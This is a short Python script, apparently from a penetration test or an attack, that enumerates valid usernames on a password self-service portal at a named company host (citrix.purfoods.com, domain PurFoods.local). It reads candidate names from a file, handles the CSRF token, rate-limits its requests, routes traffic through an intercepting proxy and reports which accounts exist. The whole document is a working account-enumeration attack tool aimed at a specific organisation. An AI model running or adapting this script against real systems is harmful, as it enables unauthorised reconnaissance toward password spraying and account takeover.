#!/usr/bin/python

from BeautifulSoup import BeautifulSoup
from time import sleep
import threading
import logging
import time
import requests
from BeautifulSoup import BeautifulSoup

logging.basicConfig(level=logging.DEBUG, format='[%(levelname)s] %(message)s')
logging.getLogger("requests").setLevel(logging.CRITICAL)
mnames = []

br = requests.Session()
br.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0'})
prox = {"http": "http://192.168.187.187:8888", "https": "http://192.168.187.187:8888"}

def bro(url, data="blank"):

  resp = ""
  try:
    if (data == "blank"): resp = br.get(url, verify=False, proxies=prox)
    else: resp = br.post(url, data=data, verify=False, proxies=prox)
  except (requests.exceptions.ConnectionError, requests.exceptions.HTTPError) as err:
    logging.critical(str(err))
    sleep(3)
    bro(url, data)
  return (resp)

resp = bro('https://citrix.purfoods.com:9251/showLogin.cc')
cresp = BeautifulSoup(resp.text)
sleep(1) 
csrf = cresp.find('input', {'id': 'adscsrf'}).get('value')

data = {'adscsrf': csrf}
resp = bro('https://citrix.purfoods.com:9251/accounts/Reset', data)
csrf = br.cookies['adscsrf']
sleep(1)

for name in open('/root/names.txt').readlines():
  data = {'adscsrf': csrf, 'userName': name.rstrip(), 'domainName': 'PurFoods.local'}
  resp = bro('https://citrix.purfoods.com:9251/accounts/PasswordSelfService', data)
  if resp.status_code == 500:
     sleep(20)
     resp = bro('https://citrix.purfoods.com:9251/accounts/PasswordSelfService', data)
  
  if not "Invalid User Name" in resp.text:
    logging.info(name.rstrip() + " was valid!")
    mnames.append(name.rstrip())
  else: logging.warning(name.rstrip() + " invalid or not setup")
  #br.cookies.clear()
  sleep(2)

for name in mnames:
  print name
